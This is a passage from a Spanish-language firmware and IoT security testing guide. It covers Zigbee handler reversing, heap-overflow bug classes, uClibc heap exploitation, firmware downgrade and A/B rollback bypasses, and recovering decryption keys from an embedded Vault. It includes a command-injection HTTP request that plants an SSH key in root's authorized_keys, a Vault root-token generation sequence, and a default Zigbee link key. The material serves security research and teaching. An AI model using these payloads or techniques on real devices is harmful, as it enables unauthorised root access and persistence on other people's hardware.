### Mapeo de mensajes Zigbee / radio-co-processor

En los hubs IoT, el stack RF suele estar dividido entre un **MCU de radio** y un proceso en espacio de usuario de Linux. Un flujo de trabajo útil consiste en mapear la ruta:<sup>[[8]](#references)</sup>

1. **Trama RF** por el aire
2. **Parser del lado del controlador** en el MCU de radio
3. **Protocolo de texto o TLV por serie/UART** reenviado a Linux (por ejemplo, `/dev/tty*`)
4. **Dispatcher de la aplicación** en el daemon principal
5. **Handler / máquina de estados** específico del protocolo

Esta arquitectura crea dos objetivos de reversing en lugar de uno. Si el controlador convierte tramas de radio binarias en un protocolo textual como `Group,Command,arg1,arg2,...`, identifica:

- Los **grupos de mensajes** y las tablas de dispatch
- Qué mensajes pueden provenir de la **red** y cuáles del propio controlador
- Los campos discriminadores exactos **específicos del fabricante** (por ejemplo, Zigbee `manufacturer_code` y `cluster_command` personalizado)
- Qué handlers solo son accesibles durante las fases de **commissioning**, descubrimiento o descarga de firmware/modelos

En el caso específico de Zigbee, captura el tráfico de pairing y comprueba si el objetivo aún depende de la **Link Key** predeterminada `ZigBeeAlliance09`. De ser así, es posible que esnifar el tráfico de commissioning revele la **Network Key**. Los install codes de Zigbee 3.0 reducen esta exposición, así que comprueba si el dispositivo probado realmente los exige.

### Handlers de protocolos específicos del fabricante y accesibilidad controlada por FSM

Los comandos Zigbee/ZCL específicos del fabricante suelen ser mejores objetivos que los clusters estandarizados, porque alimentan **código de parsing personalizado** y **FSM** internas con una validación menos probada.<sup>[[8]](#references)</sup>

Flujo de trabajo práctico:

- Sigue el dispatcher de comandos mediante reversing hasta encontrar el **handler exclusivo del fabricante**.
- Recupera las tablas de **estado**, **evento**, **comprobación**, **acción** y **siguiente estado** de la FSM.
- Identifica los **estados transitorios** que avanzan automáticamente y las ramas de reintento/error que finalmente restablecen o liberan el estado controlado por el atacante.
- Confirma qué intercambios de protocolo legítimos son necesarios para poner al daemon en el estado vulnerable, en lugar de asumir que el handler con errores siempre es accesible.

En protocolos sensibles al timing, la reproducción de paquetes desde un framework de Python puede ser demasiado lenta. Un método más fiable consiste en emular un dispositivo legítimo en hardware real (por ejemplo, un **nRF52840**) con un stack de nivel profesional del fabricante para exponer los **endpoints**, **atributos** y tiempos de commissioning correctos.

### Clase de bugs de descarga fragmentada en daemons embebidos

Una clase recurrente de bugs de firmware aparece en las descargas **fragmentadas de blobs/modelos/configuraciones**:<sup>[[8]](#references)</sup>

1. El **primer fragmento** (`offset == 0`) guarda `ctx->total_size` y asigna `malloc(total_size)`.
2. Los fragmentos posteriores solo validan campos **locales al paquete** controlados por el atacante, como `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar que no exceda el **tamaño asignado originalmente**.

Esto permite que un atacante envíe:

- Un primer fragmento válido con un tamaño total declarado **pequeño** para forzar una asignación pequeña en el heap.
- Un fragmento posterior con el **offset esperado**, pero un `chunk_len` mayor.
- Un tamaño local al paquete falsificado que supere las comprobaciones recientes y, aun así, desborde el buffer asignado originalmente.

Cuando la ruta vulnerable depende de la lógica de commissioning, la explotación debe incluir suficiente **emulación del dispositivo** para llevar al objetivo al estado esperado de descarga de modelos o blobs antes de enviar los fragmentos malformados.

### Triggers de `free()` impulsados por el protocolo

En daemons embebidos, la forma más sencilla de desencadenar la explotación de metadatos del heap suele ser no «esperar a la limpieza», sino **forzar el manejo de errores del propio protocolo**:<sup>[[8]](#references)</sup>

- Envía fragmentos de seguimiento malformados para llevar la FSM a estados de **reintento** o **error**.
- Supera el umbral de reintentos para que el daemon **restablezca el contexto** y libere el buffer corrupto.
- Usa este `free()` predecible para activar primitivas del allocator antes de que el proceso se bloquee por motivos ajenos.

Esto resulta especialmente útil contra allocators similares a **musl/uClibc/dlmalloc** en Linux embebido, donde corromper los metadatos de los chunks puede convertir la lógica unlink/unbin en una primitiva de escritura. Un patrón estable consiste en corromper un **campo de tamaño** para redirigir el recorrido del allocator hacia **fake chunks preparados dentro del buffer desbordado**, en lugar de sobrescribir de inmediato punteros reales de las bins y bloquear el proceso.

## Explotación binaria y prueba de concepto

Desarrollar un PoC para las vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura del objetivo y programar en lenguajes de bajo nivel. Las protecciones del runtime binario son poco comunes en sistemas embebidos, pero, cuando están presentes, pueden ser necesarias técnicas como Return Oriented Programming (ROP).

### Notas sobre la explotación de fastbins de uClibc (Linux embebido)

- **Fastbins + consolidación:** uClibc usa fastbins similares a los de glibc. Una asignación grande posterior puede activar `__malloc_consolidate()`, por lo que cualquier fake chunk debe superar las comprobaciones (tamaño razonable, `fd = 0` y chunks circundantes considerados «en uso»).<sup>[[6]](#references)</sup>
- **Binarios non-PIE bajo ASLR:** si ASLR está habilitado, pero el binario principal es **non-PIE**, las direcciones de `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya tenga el aspecto de una cabecera válida de heap chunk para que una asignación de fastbin termine en una **tabla de punteros a funciones**.
- **NUL que detiene el parser:** cuando se parsea JSON, un `\x00` en el payload puede detener el parsing y conservar los bytes controlados por el atacante que vienen después para un stack pivot/cadena ROP.
- **Shellcode mediante `/proc/self/mem`:** una cadena ROP que llame a `open("/proc/self/mem")`, `lseek()` y `write()` puede colocar shellcode ejecutable en un mapping conocido y saltar a él.

## Sistemas operativos preparados para el análisis de firmware

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) ofrecen entornos preconfigurados para probar la seguridad del firmware, equipados con las herramientas necesarias.

## Sistemas operativos preparados para analizar firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro diseñada para ayudar a evaluar la seguridad y realizar pentesting de dispositivos de Internet de las cosas (IoT). Ahorra mucho tiempo al ofrecer un entorno preconfigurado con todas las herramientas necesarias.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo para pruebas de seguridad embebida, basado en Ubuntu 18.04 y precargado con herramientas de pruebas de seguridad de firmware.

## Ataques de downgrade de firmware y mecanismos de actualización inseguros

Aunque un fabricante implemente comprobaciones de firmas criptográficas para las imágenes de firmware, a menudo se omite la **protección contra la reversión de versión (downgrade)**. Si el bootloader o recovery loader solo verifica la firma con una clave pública integrada, pero no compara la *versión* (o un contador monotónico) de la imagen que se va a flashear, un atacante puede instalar legítimamente un **firmware antiguo y vulnerable que aún tiene una firma válida**, reintroduciendo así vulnerabilidades corregidas.<sup>[[4]](#references)</sup>

Flujo de ataque habitual:

1. **Obtén una imagen antigua firmada**
   * Descárgala del portal público de descargas del fabricante, su CDN o sitio de soporte.
   * Extráela de las aplicaciones móviles/de escritorio complementarias (por ejemplo, desde `assets/firmware/` dentro de un APK de Android).
   * Recupérala de repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
2. **Sube la imagen o sírvela al dispositivo** a través de cualquier canal de actualización expuesto:
   * Interfaz web, API de la aplicación móvil, USB, TFTP, MQTT, etc.
   * Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *sin autenticación* que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor y activan la recuperación/actualización.
3. Tras el downgrade, explota una vulnerabilidad corregida en una versión más reciente (por ejemplo, un filtro contra command injection añadido posteriormente).
4. Opcionalmente, vuelve a flashear la imagen más reciente o desactiva las actualizaciones para evitar que te detecten una vez obtenida la persistencia.

### Ejemplo: command injection tras un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

En el firmware vulnerable (downgraded), el parámetro `md5` se concatena directamente en un comando de shell sin sanitizarlo, lo que permite inyectar comandos arbitrarios (en este caso, habilitar el acceso root mediante claves SSH). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrade hace que la corrección sea ineficaz.<sup>[[4]](#references)</sup>

### Extracción de firmware de aplicaciones móviles

Muchos proveedores incluyen imágenes completas del firmware en sus aplicaciones móviles complementarias para que la aplicación pueda actualizar el dispositivo por Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX en rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso el comando `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass de anti-rollback solo en el updater en diseños de slots A/B

Algunos proveedores implementan un **ratchet** anti-downgrade, pero solo dentro de la lógica del *updater* (por ejemplo, una rutina UDS sobre CAN, un comando de recuperación o un agente OTA en userspace). Si el **bootloader** después solo comprueba la firma/CRC de la imagen y confía en la tabla de particiones o en los metadatos del slot, todavía es posible eludir la protección contra rollback.<sup>[[7]](#references)</sup>

Diseño débil habitual:

- Los metadatos del firmware contienen tanto un descriptor de versión como un **ratchet de seguridad** / contador monotónico.
- El updater compara el ratchet de la imagen con un valor almacenado en almacenamiento persistente y rechaza las imágenes firmadas antiguas.
- El bootloader **no** analiza ese ratchet y solo verifica la cabecera, el CRC y la firma antes de arrancar el slot seleccionado.
- La activación del slot se almacena por separado en una tabla de particiones o en un contador de generación por slot y **no está vinculada criptográficamente** al digest exacto del firmware que se validó.

Esto crea una primitiva de **validar una imagen / arrancar otra** en sistemas de doble slot. Si el atacante puede hacer que el updater marque el slot B como próximo objetivo de arranque usando una imagen firmada actual y luego sobrescribir el slot B antes del reinicio, el bootloader podría arrancar igualmente la imagen downgraded porque solo confía en los metadatos del slot ya confirmados.

Patrón de abuso habitual:

1. Cargar un firmware **actual y firmado** en el slot pasivo y ejecutar la rutina normal de validación/cambio para que el diseño marque ese slot como el próximo activo.
2. **No reiniciar todavía**. Volver a ejecutar la rutina de preparación/borrado del slot en la misma sesión.
3. Aprovechar el estado de arranque obsoleto o la lógica obsoleta de selección del slot para que el updater borre el **mismo slot físico** que se acaba de promover.
4. Escribir en ese slot un firmware **antiguo, pero todavía firmado**.
5. Omitir la rutina de validación que aplica el ratchet y reiniciar directamente.
6. El bootloader selecciona el slot promovido, verifica solo la firma/integridad y arranca la imagen antigua.

Qué buscar al hacer reverse engineering de implementaciones de actualización A/B:

- Selección del slot derivada de **flags de arranque** que no se actualizan tras un cambio correcto.
- Una rutina del tipo `prepare_passive_slot()` que borra un slot basándose en un estado obsoleto, en lugar del **diseño confirmado actual**.
- Una función del tipo `part_write_layout()` que solo incrementa un **contador de generación** / flag de activo y no almacena el hash de la imagen validada.
- Comprobaciones del ratchet implementadas en userspace o en el código del updater, pero **no** en las etapas de ROM / bootloader / secure boot.
- Rutinas de borrado o recuperación que dejan el slot marcado como arrancable incluso después de que se haya borrado y reescrito su contenido.

### Lista de comprobación para evaluar la lógica de actualización

* ¿Está adecuadamente protegido el transporte/autenticación del *endpoint de actualización* (TLS + autenticación)?
* ¿El dispositivo compara **números de versión** o un **contador monotónico anti-rollback** antes de flashear?
* ¿Se verifica la imagen dentro de una cadena de secure boot (por ejemplo, con firmas comprobadas por el código de ROM)?
* ¿El **bootloader aplica el mismo ratchet** que el updater, en vez de comprobar solo la firma/CRC?
* ¿Los metadatos de activación del slot están **vinculados al digest/versión del firmware validado**, o se puede modificar un slot después de promoverlo?
* Después de un cambio de slot correcto, ¿se fuerza el reinicio del dispositivo o siguen siendo accesibles otras rutinas de actualización/borrado en la misma sesión?
* ¿El código de userland realiza comprobaciones de validez adicionales (por ejemplo, del mapa de particiones permitido o del número de modelo)?
* ¿Los flujos de actualización *parciales* o de *backup* reutilizan la misma lógica de validación?

> 💡  Si falta alguno de los elementos anteriores, es probable que la plataforma sea vulnerable a ataques de rollback.

## Firmware vulnerable para practicar

Para practicar cómo descubrir vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperación de claves de descifrado del firmware a partir del estado de KMS/Vault integrado

Cuando una imagen de actualización combina metadatos pequeños en texto plano con un blob grande de alta entropía, analiza primero el contenedor antes de intentar fuerza bruta:<sup>[[1]](#references)</sup>

- Extrae cabeceras, offsets y límites de línea con `hexdump`, `xxd`, `strings -tx`, `base64 -d` y `binwalk -E`.
- `Salted__` suele indicar un formato `enc` de OpenSSL: los siguientes 8 bytes son la sal y los bytes restantes son el texto cifrado.
- Un campo Base64 que se decodifica exactamente a `256` bytes es un indicio claro de que se trata de un texto cifrado RSA-2048 que envuelve una contraseña/clave de sesión aleatoria del firmware.
- El material PGP separado en el mismo archivo suele proteger solo la autenticidad; no des por sentado que se usa para la confidencialidad.

Si la búsqueda de claves estáticas (`grep`, `strings`, búsquedas de PEM/PGP) no funciona, haz reverse engineering de la **ruta de descifrado operativa** en vez de limitarte a buscar claves privadas:

- Descompila el binario del updater / de gestión y rastrea quién lee el blob cifrado, qué helper/API lo descifra y qué nombre lógico de clave solicita.
- Busca en el sistema de archivos raíz extraído el estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), además de archivos de unidad y scripts de inicio.
- Considera el texto plano `vault operator unseal ...`, las claves de recuperación, los tokens de bootstrap o los scripts locales de auto-unseal de KMS como equivalentes a material de clave privada.

Si el dispositivo incluye el binario original de Vault y el backend de almacenamiento, suele ser más fácil replicar ese entorno que reimplementar los componentes internos de Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con root en el KMS clonado:

- Haz que las claves transit sean exportables solo dentro del clon aislado: `vault write transit/keys/<name>/config exportable=true`
- Exporta la clave de unwrap: `vault read transit/export/encryption-key/<name>`
- Prueba la clave RSA recuperada con el par exacto de padding/hash que usa el KMS. Un fallo al descifrar con PKCS#1 v1.5 y otro con el descifrado OAEP predeterminado **no** prueban que la clave sea incorrecta; muchos flujos respaldados por Vault usan OAEP con SHA-256, mientras que las bibliotecas comunes usan SHA-1 de forma predeterminada.
- Si el payload empieza por `Salted__`, reproduce exactamente el KDF de OpenSSL del proveedor (`EVP_BytesToKey`, a menudo MD5 en dispositivos heredados) antes de intentar el descifrado AES-CBC.

Esto convierte el «firmware cifrado» en un problema más general: **recuperar las claves operativas del dispositivo y luego reproducir sin conexión los parámetros exactos de unwrap + KDF**.

## Formación y certificaciones

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Descifrado de firmware con Claude: habilidades de nivel sénior, autonomía de nivel júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking práctico de IoT: la guía definitiva para atacar el Internet de las cosas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explotación de zero-days en hardware abandonado: blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Cómo un dispositivo inteligente de 20 $ me dio acceso a tu hogar](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ahora me ves: ahora estás pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv: Explotación del Tesla Wall Connector desde el conector del puerto de carga, parte 2: omisión de la protección contra downgrades](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Haz que parpadee: explotación over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS en QEMU, parte 1: desempaquetado](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentación del kernel de Linux: dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS en QEMU, parte 2: depuración y reparación](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Contraseñas de BIOS de Dell: el cifrado XOR débil permite recuperarlas desde la memoria flash SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn: herramientas para recuperar contraseñas de BIOS de Dell](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security: repaso del hacking de hardware, parte 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
